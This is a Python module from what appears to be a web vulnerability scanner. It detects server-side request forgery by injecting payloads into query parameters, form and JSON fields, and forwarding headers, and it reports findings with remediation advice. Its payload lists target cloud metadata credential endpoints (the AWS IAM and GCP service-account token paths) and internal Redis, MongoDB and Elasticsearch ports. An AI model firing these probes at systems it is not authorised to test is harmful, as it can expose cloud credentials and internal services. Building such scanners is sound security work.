import httpx
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List
from scanner.core.scan_result import Finding, Severity
from scanner.core.crawler import CrawlResult
from scanner.utils.payloads import load_payloads

_header_probed_hosts: set = set()


def reset() -> None:
    _header_probed_hosts.clear()

_DEFAULT_CANARY = "kagesec-canary.invalid"

_HARDCODED_URL_PARAMS = {
    # core
    "url", "redirect", "next", "src", "href", "image", "uri", "path",
    "dest", "target", "fetch", "load", "file", "link", "proxy",
    # webhook / notification callbacks (common in CI/CD, payment, SaaS)
    "webhook", "webhookurl", "webhook_url", "callbackurl", "callback_url",
    "callback", "notify", "notifyurl", "notify_url", "pingback", "ping",
    "postback", "endpoint", "hook",
    # return / redirect flows (OAuth, e-commerce, SSO)
    "returnurl", "return_url", "successurl", "success_url", "cancelurl",
    "cancel_url", "failurl", "fail_url", "errorurl", "error_url",
    "forwardurl", "forward_url", "continue", "goto",
    # media / content fetchers (avatar services, RSS readers, scrapers)
    "avatar", "logo", "icon", "photo", "thumb", "thumbnail", "cover",
    "background", "feed", "rss", "sitemap", "import", "export",
    # API / service integration (microservices, proxy patterns)
    "service", "remote", "host", "server", "api", "apiurl", "api_url",
    "base", "baseurl", "base_url", "origin", "domain", "location",
    # document / file operations (upload, download, import flows)
    "document", "report", "template", "resource", "ref", "reference",
    "attachment", "download", "upload", "open", "read",
}

_HARDCODED_CLOUD = [
    ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "instance-type"], "AWS IMDS v1"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "SecretAccessKey"], "AWS IAM credentials"),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["compute", "vmId", "subscriptionId"], "Azure IMDS"),
    ("http://metadata.google.internal/computeMetadata/v1/", ["computeMetadata", "project", "instance"], "GCP metadata"),
    ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", ["access_token", "token_type"], "GCP service account token"),
]

_HARDCODED_INTERNAL = [
    ("http://127.0.0.1/", None, "localhost"),
    ("http://localhost/", None, "localhost"),
    ("http://0.0.0.0/", None, "all-interfaces"),
    ("http://127.0.0.1:8080/", None, "localhost:8080"),
    ("http://127.0.0.1:9200/", ["elasticsearch", "cluster_name"], "Elasticsearch"),
    ("http://127.0.0.1:6379/", ["-ERR", "+PONG"], "Redis"),
    ("http://127.0.0.1:27017/", ["mongod", "MongoDB"], "MongoDB"),
]

def _load_ssrf_data():
    data = load_payloads("ssrf")
    if not data:
        return _HARDCODED_CLOUD, _HARDCODED_INTERNAL, _HARDCODED_URL_PARAMS
    try:
        cloud = [(p["url"], p.get("signatures"), p["label"]) for p in data.get("cloud_payloads", [])]
        internal = [(p["url"], p.get("signatures"), p["label"]) for p in data.get("internal_payloads", [])]
        params = set(data.get("ssrf_params", []))
        return (cloud or _HARDCODED_CLOUD,
                internal or _HARDCODED_INTERNAL,
                params or _HARDCODED_URL_PARAMS)
    except (KeyError, TypeError):
        return _HARDCODED_CLOUD, _HARDCODED_INTERNAL, _HARDCODED_URL_PARAMS

CLOUD_PAYLOADS, INTERNAL_PAYLOADS, URL_PARAMS = _load_ssrf_data()

SSRF_HEADERS = ["X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "X-Remote-IP", "X-Client-IP", "True-Client-IP"]

# Timing-based SSRF: unreachable private IPs — if the server fetches one, the
# TCP connect attempt blocks until timeout (detectable as a response-time delta).
_SSRF_TIMING_TARGETS = [
    "http://10.255.255.1:7777/",    # RFC 1918, unlikely routable from any cloud host
    "http://172.31.255.254:7777/",  # AWS VPC range edge
]
_SSRF_TIMING_DELAY = 3.0   # minimum delta (seconds) to confirm server-side fetching


def test(page: CrawlResult, client: httpx.Client, oob=None) -> List[Finding]:
    findings = []
    parsed = urlparse(page.url)
    params = parse_qs(parsed.query)

    # URL parameter injection — by param NAME in known list
    for param_name in list(params.keys()):
        if param_name.lower() not in URL_PARAMS:
            continue
        _test_param(page.url, parsed, params, param_name, client, findings)

    # URL parameter injection — by param VALUE (any name whose value looks like a URL).
    # Framework-agnostic: catches custom param names not in the hardcoded list.
    for param_name, values in params.items():
        if param_name.lower() in URL_PARAMS:
            continue  # already tested above
        val = values[0] if values else ""
        if val.startswith(("http://", "https://", "//")):
            _test_param(page.url, parsed, params, param_name, client, findings)

    # Form-based SSRF — by input NAME
    for form in page.forms:
        for inp in form["inputs"]:
            if inp["name"] and inp["name"].lower() in URL_PARAMS:
                _test_form_param(form, inp["name"], client, findings)

    # Form-based SSRF — JSON body (REST APIs and modern web apps).
    # Many apps ignore URL-encoded bodies and only parse JSON — test both.
    _test_json_body_ssrf(page, client, findings)

    # Header-based SSRF — run once per host, not per page
    parsed_host = urlparse(page.url)
    host_key = f"{parsed_host.scheme}://{parsed_host.netloc}"
    if host_key not in _header_probed_hosts:
        _header_probed_hosts.add(host_key)
        _test_header_ssrf(page.url, client, findings)

    # Timing-based SSRF — works without OOB or cloud metadata in response.
    # Injects unreachable private IP into URL-valued params; server-side fetch attempt
    # delays the response by its HTTP client connect timeout (detectable as a delta).
    _test_timing_ssrf(page, client, findings)

    # Blind SSRF via OOB canary (DNS/HTTP callback)
    if oob:
        canary = oob.get_canary()
        canary_payloads = [
            f"http://{canary}/ssrf",
            f"https://{canary}/ssrf",
            f"//{canary}/ssrf",
        ]
        for param_name in list(params.keys()):
            if param_name.lower() not in URL_PARAMS:
                continue
            for canary_payload in canary_payloads:
                new_params = dict(params)
                new_params[param_name] = [canary_payload]
                test_url = urlunparse(parsed._replace(query=urlencode(new_params, doseq=True)))
                try:
                    client.get(test_url, timeout=5)
                except Exception:
                    pass

    return findings


def _test_param(original_url, parsed, params, param_name, client, findings):
    for payload, signatures, label in CLOUD_PAYLOADS + INTERNAL_PAYLOADS:
        new_params = dict(params)
        new_params[param_name] = [payload]
        test_url = urlunparse(parsed._replace(query=urlencode(new_params, doseq=True)))
        try:
            resp = client.get(test_url, timeout=5)
        except Exception:
            continue
        if signatures:
            matched = next((s for s in signatures if s in resp.text), None)
            if matched:
                findings.append(_finding(original_url, param_name, payload, label, matched))
                return
        # No signature list means this is an internal/generic target — require explicit
        # content match rather than status+length, which produces SPA false positives.


def _test_form_param(form, param_name, client, findings):
    for payload, signatures, label in CLOUD_PAYLOADS:
        data = {i["name"]: i.get("value", "") for i in form["inputs"] if i["name"]}
        data[param_name] = payload
        try:
            method = form["method"].upper()
            resp = client.request(method, form["action"], data=data, timeout=5)
        except Exception:
            continue
        if signatures:
            matched = next((s for s in signatures if s in resp.text), None)
            if matched:
                findings.append(_finding(form["action"], param_name, payload, label, matched))
                return


def _test_json_body_ssrf(page: CrawlResult, client, findings) -> None:
    """SSRF via JSON POST body — covers REST APIs and modern web apps.

    Many frameworks ignore application/x-www-form-urlencoded and only parse JSON.
    Test each POST form by sending JSON with SSRF payloads in every field.
    """
    for form in page.forms:
        if form["method"].upper() != "POST":
            continue
        inputs = {i["name"]: i.get("value", "") for i in form["inputs"] if i["name"]}
        if not inputs:
            continue
        for field_name in list(inputs.keys()):
            for payload, signatures, label in CLOUD_PAYLOADS[:3]:
                body = dict(inputs)
                body[field_name] = payload
                try:
                    resp = client.post(
                        form["action"], json=body,
                        headers={"Content-Type": "application/json"}, timeout=8,
                    )
                except Exception:
                    continue
                if signatures:
                    matched = next((s for s in signatures if s in resp.text), None)
                    if matched:
                        findings.append(_finding(form["action"], field_name, payload, label, matched))
                        return


def _test_header_ssrf(url, client, findings):
    # Fetch a baseline without any injected header so we can confirm the
    # cloud-metadata signatures aren't already present in the page naturally.
    try:
        baseline = client.get(url, timeout=5)
        baseline_text = baseline.text
    except Exception:
        baseline_text = ""

    _CLOUD_SIGS = ["ami-id", "instance-id", "metadata", "iam/security-credentials"]
    internal_ips = ["127.0.0.1", "169.254.169.254", "10.0.0.1", "192.168.1.1"]
    for header in SSRF_HEADERS:
        for ip in internal_ips:
            try:
                resp = client.get(url, headers={header: ip})
            except Exception:
                continue
            # Only report if a cloud-metadata signature appears after injection
            # AND was absent from the baseline response.
            sig = next(
                (s for s in _CLOUD_SIGS if s in resp.text and s not in baseline_text),
                None,
            )
            if sig:
                findings.append(Finding(
                    title=f"SSRF via HTTP Header: {header}",
                    severity=Severity.HIGH,
                    url=url,
                    parameter=header,
                    payload=ip,
                    evidence=f"Cloud metadata signature '{sig}' appeared in response after injecting {header}: {ip} (absent in baseline)",
                    description=(
                        "The server uses a forwarded IP header to make internal requests, "
                        "allowing SSRF via header injection."
                    ),
                    remediation="Do not use client-supplied forwarding headers to determine request routing or targets.",
                    cwe="CWE-918",
                    cvss=7.5,
                    owasp_category="A10:2021 Server-Side Request Forgery",
                    standards=["ISO27001-8.23", "HIPAA-164.312a"],
                    confidence=1.0,
                ))
                return


def _test_timing_ssrf(page: CrawlResult, client: httpx.Client, findings: List[Finding]) -> None:
    """Timing-based SSRF: detects server-side URL fetching without OOB or response content.

    Injects an unreachable private IP as the URL parameter value. If the server issues
    an outbound request, the TCP connect attempt blocks until its timeout fires —
    measured as a delta from a benign-value baseline. Double-confirm mirrors SQLi
    time-based detection to keep false-positive rate low.
    """
    parsed = urlparse(page.url)
    params = parse_qs(parsed.query)
    if not params:
        return

    candidates = [
        p for p in params
        if p.lower() in URL_PARAMS or (
            params[p] and params[p][0].startswith(("http://", "https://", "//"))
        )
    ]
    if not candidates:
        return

    for param_name in candidates:
        # Baseline: inject an obviously-invalid but non-routable hostname — server
        # returns immediately (DNS NXDOMAIN or immediate connection refusal).
        _base_params = dict(params)
        _base_params[param_name] = ["http://kagesec.invalid/"]
        _base_url = urlunparse(parsed._replace(query=urlencode(_base_params, doseq=True)))
        t0 = time.time()
        try:
            client.get(_base_url, timeout=14)
        except Exception:
            pass
        baseline_time = time.time() - t0

        for target in _SSRF_TIMING_TARGETS:
            probe_times = []
            for _ in range(2):
                new_params = dict(params)
                new_params[param_name] = [target]
                test_url = urlunparse(parsed._replace(query=urlencode(new_params, doseq=True)))
                t0 = time.time()
                try:
                    client.get(test_url, timeout=14)
                    probe_times.append(max(time.time() - t0 - baseline_time, 0.0))
                except Exception:
                    probe_times.append(14.0)   # timeout itself confirms blocking

            if len(probe_times) == 2 and all(t >= _SSRF_TIMING_DELAY for t in probe_times):
                findings.append(_timing_finding(page.url, param_name, target, probe_times, baseline_time))
                return

    # POST form bodies — same delta pattern, covers webhook/callback/import fields
    # that never appear in the URL query string.
    for form in page.forms:
        if form["method"].upper() != "POST":
            continue
        inputs = {i["name"]: i.get("value", "") for i in form["inputs"] if i["name"]}
        if not inputs:
            continue

        form_candidates = [
            name for name, val in inputs.items()
            if name.lower() in URL_PARAMS or val.startswith(("http://", "https://", "//"))
        ]
        if not form_candidates:
            continue

        for field_name in form_candidates:
            # Baseline: submit form with a non-routable NXDOMAIN value so the server
            # returns immediately (DNS failure, no delay from outbound connection attempt).
            baseline_data = dict(inputs)
            baseline_data[field_name] = "http://kagesec.invalid/"
            t0 = time.time()
            try:
                client.post(form["action"], data=baseline_data, timeout=14)
            except Exception:
                pass
            baseline_time = time.time() - t0

            for target in _SSRF_TIMING_TARGETS:
                probe_times = []
                for _ in range(2):
                    probe_data = dict(inputs)
                    probe_data[field_name] = target
                    t0 = time.time()
                    try:
                        client.post(form["action"], data=probe_data, timeout=14)
                        probe_times.append(max(time.time() - t0 - baseline_time, 0.0))
                    except Exception:
                        probe_times.append(14.0)

                if len(probe_times) == 2 and all(t >= _SSRF_TIMING_DELAY for t in probe_times):
                    findings.append(_timing_finding(form["action"], field_name, target, probe_times, baseline_time))
                    return


def _timing_finding(url: str, param: str, target: str, probe_times: list, baseline_time: float) -> Finding:
    return Finding(
        title="Server-Side Request Forgery (SSRF) — Timing-Based",
        severity=Severity.HIGH,
        url=url,
        parameter=param,
        payload=target,
        evidence=(
            f"Both probes delayed >{_SSRF_TIMING_DELAY}s "
            f"({probe_times[0]:.1f}s, {probe_times[1]:.1f}s delta) "
            f"vs {baseline_time:.2f}s baseline when injecting unreachable {target}"
        ),
        description=(
            "The server appears to issue outbound HTTP requests based on the "
            "URL-valued parameter or form field. Detected via response-time delta "
            "against an unreachable private IP — characteristic of SSRF."
        ),
        remediation=(
            "Validate and whitelist allowed URL destinations. "
            "Block requests to RFC 1918 / link-local IP ranges at the egress firewall. "
            "Use IMDSv2 on AWS (requires session token)."
        ),
        cwe="CWE-918",
        cvss=7.5,
        owasp_category="A10:2021 Server-Side Request Forgery",
        standards=["ISO27001-8.23", "HIPAA-164.312a"],
        confidence=0.85,
    )


def _finding(url, param, payload, label, matched):
    return Finding(
        title=f"Server-Side Request Forgery (SSRF) — {label}",
        severity=Severity.CRITICAL,
        url=url,
        parameter=param,
        payload=payload,
        evidence=f"Internal resource content detected: '{matched}'",
        description=(
            "SSRF allows attackers to make the server issue requests to internal infrastructure, "
            "including cloud metadata endpoints that expose credentials and instance information."
        ),
        remediation=(
            "Validate and whitelist allowed URL destinations. "
            "Block requests to internal IP ranges (169.254.x.x, 10.x.x.x, 192.168.x.x, 127.x.x.x). "
            "Use IMDSv2 on AWS (requires session token). "
            "Deploy a network egress firewall."
        ),
        cwe="CWE-918",
        cvss=9.8,
        owasp_category="A10:2021 Server-Side Request Forgery",
        standards=["ISO27001-8.23", "HIPAA-164.312a", "GDPR-Art32"],
        confidence=1.0,
    )
